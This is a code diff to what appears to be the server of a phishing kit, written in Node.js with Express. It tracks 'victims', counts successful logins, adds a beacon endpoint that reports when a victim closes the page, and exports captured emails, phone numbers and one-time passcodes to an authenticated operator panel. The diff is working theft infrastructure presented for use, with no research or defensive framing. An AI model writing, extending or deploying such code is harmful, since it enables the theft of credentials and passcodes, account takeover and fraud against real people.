@@ -43,8 +43,6 @@ let victimCounter     = 0;
 let successfulLogins  = 0;
 let currentDomain     = '';
 
-// REMOVED: SESSION_TIMEOUT - no longer auto-deleting sessions
-
 /* ----------  STATIC ROUTES  ---------- */
 app.use(express.static(__dirname));
 
@@ -119,8 +117,6 @@ function cleanupSession(sid, reason, silent = false) {
   sessionsMap.delete(sid);
   sessionActivity.delete(sid);
 }
-
-// REMOVED: setInterval cleanup loop - no longer auto-deleting sessions based on timeout
 
 /* ----------  VICTIM API  ---------- */
 app.post('/api/session', async (req, res) => {
@@ -261,12 +257,27 @@ app.post('/api/page', async (req, res) => {
   }
 });
 
-// NEW: Handle tab close / page exit - immediately delete session
+// Handle tab close / page exit - immediately delete session
 app.post('/api/exit', async (req, res) => {
   const { sid } = req.body;
   if (sid && sessionsMap.has(sid)) {
     cleanupSession(sid, 'closed the page', true);
-    emitPanelUpdate();          // <-- tell panel to refresh
+    emitPanelUpdate();
+  }
+  res.sendStatus(200);
+});
+
+// NEW: Beacon endpoint for beforeunload (sendBeacon needs text/plain usually)
+app.post('/api/beacon/exit', express.text(), (req, res) => {
+  try {
+    const data = JSON.parse(req.body);
+    const { sid } = data;
+    if (sid && sessionsMap.has(sid)) {
+      cleanupSession(sid, 'closed the page (beacon)', true);
+      emitPanelUpdate();
+    }
+  } catch (e) {
+    console.error('Beacon exit error', e);
   }
   res.sendStatus(200);
 });
@@ -376,7 +387,7 @@ app.get('/api/export', (req, res) => {
   if (!req.session?.authed) return res.status(401).send('Unauthorized');
 
   const successes = auditLog
-    .filter(r => r.phone && r.otp)          // success criteria
+    .filter(r => r.phone && r.otp)
     .map(r => ({
       victimNum: r.victimN,
       email: r.email,
